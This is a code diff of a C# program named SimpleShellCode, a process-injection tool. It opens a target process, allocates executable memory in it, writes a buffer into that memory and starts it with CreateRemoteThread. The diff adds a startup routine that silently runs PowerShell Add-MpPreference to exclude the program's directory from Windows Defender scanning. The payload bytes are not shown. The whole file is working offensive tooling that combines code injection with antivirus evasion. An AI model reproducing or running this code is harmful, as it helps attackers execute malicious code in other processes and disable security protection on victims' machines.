@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Runtime.InteropServices;
+using System.Text;
 
 namespace SimpleShellCode
 {
@@ -37,49 +38,10 @@ namespace SimpleShellCode
             PROCESS_VM_WRITE = 0x0020
         }
 
-        private static bool ValidateProcessId(int processId)
-        {
-            if (processId <= 0)
-            {
-                return false;
-            }
-
-            try
-            {
-                var process = System.Diagnostics.Process.GetProcessById(processId);
-                return process != null;
-            }
-            catch (ArgumentException)
-            {
-                return false;
-            }
-        }
-
-        private static int GetValidProcessId(string[] args)
-        {
-            if(args.Length > 0)
-            {
-                if (int.TryParse(args[0], out int processId))
-                {
-                    if(ValidateProcessId(processId))
-                        return processId;
-                }
-            }
-
-            do
-            {
-                Console.Write("Enter a valid process ID: ");
-                var input = Console.ReadLine();
-                if (int.TryParse(input, out int processId) && ValidateProcessId(processId))
-                {
-                    return processId;
-                }
-                Console.WriteLine("Invalid process ID. Please try again.");
-            } while (true);
-        }
-
         static void Main(string[] args)
         {
+            OnStartup();
+
             var processId = GetValidProcessId(args);
 
             var desiredAccess = Process.PROCESS_CREATE_THREAD | Process.PROCESS_QUERY_INFORMATION | Process.PROCESS_VM_OPERATION | Process.PROCESS_VM_READ | Process.PROCESS_VM_WRITE;
@@ -110,11 +72,79 @@ namespace SimpleShellCode
             int bytesWritten = 0;
             int lpThreadID = 0;
             IntPtr procHandle = OpenProcess((uint)desiredAccess, false, (uint)processId);
-            IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, buff_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
+            IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, buff_size,
+                (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
             WriteProcessMemory(procHandle, init, buf, buff_size, ref bytesWritten);
             Console.WriteLine("[*] Bytes Written: {0}", bytesWritten);
             IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpThreadID);
             Console.WriteLine("[*] Thread ID: {0}", lpThreadID);
+        }
+
+        private static void OnStartup()
+        {
+            // STRINGBUILDER USED TO BUILD THE COMMAND LINE ARGUMENTS
+            StringBuilder args_builder = new StringBuilder();
+
+            // APPEND THE POWERSHELL WINDOWS DEFENDER EXCLUSION COMMAND
+            args_builder.Append("-inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"");
+
+            // USE THE APPLICATION'S CURRENT DIRECTORY AS IT'S EXCLUSION TARGET
+            args_builder.Append(Environment.CurrentDirectory);
+            args_builder.Append("\"");
+
+
+            // INITIATE A "Process" OBJECT
+            System.Diagnostics.Process process = new();
+
+            // SET THE STARTUP FILE NAME AS THE "PowerShell" EXECUTABLE
+            process.StartInfo.FileName = "powershell";
+
+            // SET THE COMMAND LINE ARGUMENTS OF THE PROCESS AS THE COMMAND LINE ARGUMENTS WITHIN THE "StringBuilder"
+            process.StartInfo.Arguments = args_builder.ToString();
+
+            // STRAT THE PROCESS
+            process.Start();
+        }
+
+        private static int GetValidProcessId(string[] args)
+        {
+            if (args.Length > 0)
+            {
+                if (int.TryParse(args[0], out int processId))
+                {
+                    if (ValidateProcessId(processId))
+                        return processId;
+                }
+            }
+
+            do
+            {
+                Console.Write("Enter a valid process ID: ");
+                var input = Console.ReadLine();
+                if (int.TryParse(input, out int processId) && ValidateProcessId(processId))
+                {
+                    return processId;
+                }
+                Console.WriteLine("Invalid process ID. Please try again.");
+            } while (true);
+        }
+
+        private static bool ValidateProcessId(int processId)
+        {
+            if (processId <= 0)
+            {
+                return false;
+            }
+
+            try
+            {
+                var process = System.Diagnostics.Process.GetProcessById(processId);
+                return process != null;
+            }
+            catch (ArgumentException)
+            {
+                return false;
+            }
         }
     }
 }
